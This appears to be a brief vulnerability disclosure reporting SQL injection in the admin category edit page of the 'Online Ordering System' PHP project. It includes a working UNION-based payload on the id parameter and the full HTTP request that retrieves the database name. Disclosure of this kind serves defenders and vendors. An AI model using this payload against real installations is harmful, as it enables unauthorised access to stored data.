# Online Ordering System By janobe has SQL injection vulnerability

Author： k0xx

vendor: https://www.sourcecodester.com/php/12978/online-ordering-system-phpmysqli.html

Vulnerability file: /ordering/admin/category/index.php?view=edit&id=

Vulnerability location: /ordering/admin/category/index.php?view=edit&id= //id is Injection point

[+]Payload: /ordering/admin/category/index.php?view=edit&id=-3%27%20union%20select%201,database(),3--+ //id is Injection point

Current database name: multistoredb

```sql
GET /ordering/admin/category/index.php?view=edit&id=-3%27%20union%20select%201,database(),3--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/168951684-0aededb5-bb1d-42ea-a6fd-4f5190ee7008.png)

![image](https://user-images.githubusercontent.com/54017627/168951714-bfed6eee-6fe2-4ac9-8c90-d6a2edaab596.png)
